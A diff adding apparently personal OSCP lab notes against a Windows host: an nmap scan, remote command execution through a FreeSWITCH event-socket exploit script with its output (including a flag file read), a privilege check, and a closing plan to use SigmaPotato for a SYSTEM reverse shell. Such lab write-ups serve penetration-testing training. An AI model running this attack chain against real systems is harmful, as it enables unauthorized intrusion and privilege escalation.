@@ -1,0 +1,72 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.138.151 > 151.txt
+PORT     STATE SERVICE          VERSION
+80/tcp   open  http             Microsoft IIS httpd 10.0
+|_http-title: IIS Windows
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+3389/tcp open  ms-wbt-server    Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: OSCP
+|   DNS_Computer_Name: OSCP
+|   Product_Version: 10.0.19041
+|_  System_Time: 2026-04-26T02:14:14+00:00
+|_ssl-date: 2026-04-26T02:14:19+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=OSCP
+| Issuer: commonName=OSCP
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-25T02:05:55
+| Not valid after:  2026-10-25T02:05:55
+| MD5:   9909:7e71:4df7:8e51:b74b:3fc6:49fc:86f5
+|_SHA-1: c9ec:085c:6532:98cc:fc45:7c92:6a92:bee1:e633:b425
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+search freeswitch download exploit script.
+
+$ python3 freeswitch.py 192.168.138.151 "whoami&ipconfig&type C:\Users\chris\desktop\local.txt" 
+Authenticated
+Content-Type: api/response
+Content-Length: 304
+
+oscp\chris
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.138.151
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.138.254
+21bba5e9590dd89b6564084d65306df6
+
+$ python3 freeswitch.py 192.168.138.151 "whoami /priv"
+Authenticated
+Content-Type: api/response
+Content-Length: 777
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+
+Upload SigmaPotato.exe get a SYSTEM reverse shell.
+
